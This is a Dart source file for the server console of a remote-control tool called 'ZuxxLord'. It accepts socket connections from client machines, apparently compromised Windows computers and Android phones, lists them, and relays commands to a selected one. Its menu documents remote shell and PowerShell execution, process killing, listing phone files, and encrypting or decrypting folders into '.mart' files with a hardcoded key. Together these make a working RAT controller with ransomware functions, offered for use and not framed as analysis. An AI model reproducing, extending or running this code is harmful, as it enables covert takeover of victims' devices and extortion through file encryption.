import 'dart:io';

import 'package:server/models/client.dart';
import 'package:server/models/server.dart';

String ip = "127.0.0.1";
int port = 8000;

List<Client> clients = [];
late Client clientSelected;
String STATE = 'MENU';
//in the terminal/cmd, go to server/bin folder, and run the command "dart run main.dart"
String menu = '''

              
\x1B[0m
        \x1B[34m 
        ZuxxLord\x1B[0m     \x1B[35m 
        ZuxxLord\x1B[0m
    
        Options:
        /list - List all of the Clients connected
        /set id - Enter the command interface for the selected client
        /exit - Exit to command interface

        Commands Avaible:
        * Get Information from System:  {"id": "1"} 
        * Run Command on System:  {"id": "2", "parameter": "ipconfig"}
        * Run Command on System through powershell *(Windows only): {"id": "3", "parameter": "ls"}
        * Kill Process in the System: {"id": "4", "parameter": "4517"} 
        * List phone files: {"id":"5"}
        * Encrypt files from selected path to .mart: 
          ** Desktop: {"id": "6", "path":"C:\\Users\\docteur\\Desktop\\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"} 
          ** Phone: {"id": "6", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}     

        * Decrypt files(.MART) from selected path: 
          ** Desktop: {"id": "7", "path":"C:\\Users\\docteur\\Desktop\\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO" }
          ** Phone: {"id": "7", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}     
          
  ''';

void main() {
  print(menu);
  print('      🟢 Server listen: $ip:$port');
  Server(ip, port).listen((Socket socketClient) {
    var newClient = Client(socketClient);
    newClient.listener((String message) {
      print(message);
    });
    clients.add(newClient);
    print(
        '       New Client \x1B[32m${newClient.ip}:${newClient.port}\x1B[0m Connected');
  }, (error) {
    print('🔴 Server listen, ${error.toString()}');
    STATE = 'MENU';
  });

  stdin.listen((data) {
    var dataString = String.fromCharCodes(data).trim();
    try {
      optionsMenu(dataString);
    } catch (error) {
      print('Error in input: ${error.toString()}');
    }
  });
}

void optionsMenu(data) {
  switch (STATE) {
    case 'MENU':
      if (data.contains('/list')) {
        print('Id  |  Host  |  Os  |  Lang');
        clients.forEach((client) {
          var indexClient = clients.indexOf(client);
          print(
              '$indexClient  |  ${client.ip}:${client.port}  |  ${client.os}  |  ${client.lang}');
        });
      } else if (data.contains('/set')) {
        var indexSet = int.parse(data.split(' ')[1]);
        clientSelected = clients[indexSet];
        print('Command set to client id $indexSet, type /menu to back');
        STATE = 'COMMAND';
      }
      break;
    case 'COMMAND':
      if (data.contains('/exit')) {
        print(menu);
        STATE = 'MENU';
      } else {
        clientSelected.sendMessage(data + '\n\r');
      }
      break;
  }
}
